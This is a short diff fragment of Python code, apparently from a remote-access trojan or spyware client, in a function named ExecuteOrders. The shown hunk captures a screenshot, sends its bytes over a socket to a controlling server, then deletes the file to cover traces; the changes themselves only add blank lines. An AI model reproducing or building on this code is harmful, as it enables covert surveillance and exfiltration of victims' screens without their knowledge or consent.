@@ -72,10 +72,14 @@ def ExecuteOrders():
             	Snapshot.save(Path) # Save screenshot
 
             	with open(Path,"rb") as F:
+
                     Data = F.read() # Read File Bytes
+
                     S.sendall(Data) # Send the Screenshot
+
                     
             	F.close() # Close The File
+            	
             	os.remove(Path) # Delete Screenshot after sending it to server
 
             except:
